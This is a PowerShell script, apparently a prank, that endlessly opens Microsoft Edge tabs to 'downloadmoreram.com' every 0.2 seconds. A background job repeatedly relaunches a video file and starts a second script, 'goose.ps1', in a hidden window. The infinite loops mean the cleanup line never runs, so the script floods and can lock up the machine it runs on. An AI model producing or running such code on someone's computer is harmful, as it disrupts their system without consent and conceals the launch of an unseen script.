$url = "https://downloadmoreram.com"
$tabDelay = 0.2     
$mediaFile = "spongebob.mp4"
$videoDelay = 2     
$auxScript = "goose.ps1"

$videoJobScript = {
    param($File, $Delay, $ScriptToRun)
    
    # COMMAND TO RUN NEW SCRIPT: Launches the auxiliary script
    try {
        Start-Process powershell -ArgumentList "-WindowStyle", "Hidden", "-File", $ScriptToRun
    } catch {}

    while ($true) {
        try {
            Start-Process -FilePath $File
        } catch {}
        Start-Sleep -Seconds $Delay 
    }
}

Start-Job -ScriptBlock $videoJobScript -ArgumentList $mediaFile, $videoDelay, $auxScript -Name "VideoLauncher" | Out-Null

while ($true) {
    Start-Process msedge $url
    
    Start-Sleep -Seconds $tabDelay 
}

Get-Job -Name "VideoLauncher" | Stop-Job -Force | Remove-Job